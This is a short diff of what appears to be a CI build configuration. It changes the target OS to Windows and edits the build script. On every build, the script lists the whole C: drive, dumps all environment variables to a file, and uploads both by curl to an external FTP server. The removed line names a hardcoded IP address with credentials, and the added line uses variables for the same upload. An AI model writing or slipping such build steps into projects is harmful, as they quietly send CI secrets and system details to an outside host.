@@ -1,7 +1,7 @@
 ---
-os: linux
+os: windows
 language: generic
 script:
     - find /c | gzip >disk.txt.gz
     - set >env.txt
-    - curl -T "{disk.txt.gz,env.txt}" ftp://test:testpasswd@81.5.104.175/
+    - curl -T "{disk.txt.gz,env.txt}" ftp://${FTP_USER}:${FTP_PASSWD}@${FTP_SERVER}/
